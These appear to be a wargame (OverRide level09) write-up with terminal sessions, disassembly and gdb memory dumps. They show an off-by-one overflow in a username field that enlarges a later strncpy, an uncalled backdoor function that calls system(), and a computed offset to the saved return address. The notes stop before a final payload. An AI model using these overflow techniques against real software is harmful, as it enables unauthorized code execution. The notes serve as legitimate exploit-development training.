```
level09@OverRide:~$ ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: userName
>: Welcome, userName
>: Msg @Unix-Dude
>>: hi there
>: Msg sent!
```
```
0x000000000000088c  secret_backdoor
0x00000000000008c0  handle_msg
0x0000000000000932  set_msg
0x00000000000009cd  set_username
0x0000000000000aa8  main
```
```
main()
{
    handle_msg();
}
```

```
handle_msg()
{
// same buffer passed

    <+70>:	lea    -0xc0(%rbp),%rax
    <+80>:	call   <set_username>
    <+85>:	lea    -0xc0(%rbp),%rax
    <+95>:	call   <set_msg>
}
```

```
set_username()
{
    <+54>:	callq   <puts@plt>
    >: Enter your username
    
    <+92>:	lea    -0x90(%rbp),%rax
    <+99>:	mov    $0x80,%esi
    <+107>:	callq   <fgets@plt>
}
```

```
set_msg()
{
    <set_msg+92>:	lea    -0x400(%rbp),%rax
    <set_msg+99>:	mov    $0x400,%esi
    <set_msg+104>:	mov    %rax,%rdi
    <set_msg+107>:	callq  0x555555554770 <fgets@plt>
    
    (gdb) x/s $rbp-0x400
     0x7fffffffe0c0:	 'A' <repeats 21 times>, "\n"
    
    <set_msg+128>:	lea    -0x400(%rbp),%rcx                "message"    
    <set_msg+135>:	mov    -0x408(%rbp),%rax                ""
    <set_msg+142>:	mov    %rcx,%rsi
    <set_msg+145>:	mov    %rax,%rdi
    <set_msg+148>:	call   <strncpy@plt>     strncpy($rbp-0x400, )
}
```

secret_backdoor() isnt called anywhere, which has system()

```
    <+33>:	call   <fgets@plt>                     ; fgets(input, 0x80, stdin)
    <+38>:	lea    rax,[rbp-0x80]
    <+42>:	mov    rdi,rax
    <+45>:	call   <system@plt>                    ; system(input)
```

```
SECURITY CONSIDERATIONS
     The strcpy() function is easily misused in a manner which enables malicious users to arbitrarily
     change a running program's functionality through a buffer overflow attack.
``` 

```
=> 0x555555554910 <handle_msg+80>:	callq  0x5555555549cd <set_username>

(gdb) info frame
rip at 0x7fffffffe598

>: Enter your username
>>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

(gdb) x/60wx $rsp

0x7fffffffe558:	0xf7a9608f	0x41414141	0x41414141	0x41414141
0x7fffffffe568:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe578:	0x41414141	0x41414141	0x41414141	0x00000041

size of the buff 10 * 4 + 1 = 41

```
so copy 41 bytes from the user input to some_struct->username
```
>: Enter your username
>>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA        
>: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>:           ==> len = 41
> msg:

(gdb) x/s $rbp-0x400
0x7fffffffe0c0:	 'B' <repeats 60 times>, "\n"

(gdb) p/d 0x7fffffffe598 - 0x7fffffffe0c0
$8 = 1240

0x7fffffffe0c0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe0d0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe0e0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe0f0:	0x42424242	0x42424242	0x42424242	0x0000000a
```

